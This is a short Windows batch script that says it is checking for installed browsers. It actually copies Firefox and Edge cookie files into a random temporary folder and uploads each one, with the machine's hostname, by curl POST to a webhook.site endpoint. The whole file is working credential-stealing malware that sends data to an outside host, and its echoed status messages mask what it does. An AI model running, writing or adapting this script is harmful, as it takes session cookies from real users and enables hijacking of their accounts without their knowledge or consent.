@echo off
echo Checking for installed browsers...
set "RANDOMNAME=%RANDOM%"
set "DEST=%TMP%\%RANDOMNAME%"
mkdir "%DEST%"
for /f "tokens=*" %%a in ('hostname') do set DeviceName=%%a
echo Randomfile is %DEST%

if exist "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" (
    echo Google Chrome is installed.
)

if exist "C:\Program Files\Mozilla Firefox\firefox.exe" (
    echo Mozilla Firefox is installed.
    for /d %%i in ("%APPDATA%\Mozilla\Firefox\Profiles\*.default-release") do (
        cd "%%i"
        echo "%%i\cookies.sqlite*"
        copy "%%i\cookies.sqlite*" "%DEST%"
    )
)

if exist "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" (
    echo Microsoft Edge is installed.
    echo "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies"
    copy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies*" "%DEST%"
)

echo Done.

:: Iterate over files in the destination directory and send email for each file
for %%A in ("%DEST%\*") do (
    curl -X POST -F "file=@%%A" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
    curl -X POST -d "{'Device':'%DeviceName%', 'File':'%%A'}" https://webhook.site/50e04090-829b-4ff1-bb01-7a9d2b82d17c
)
pause
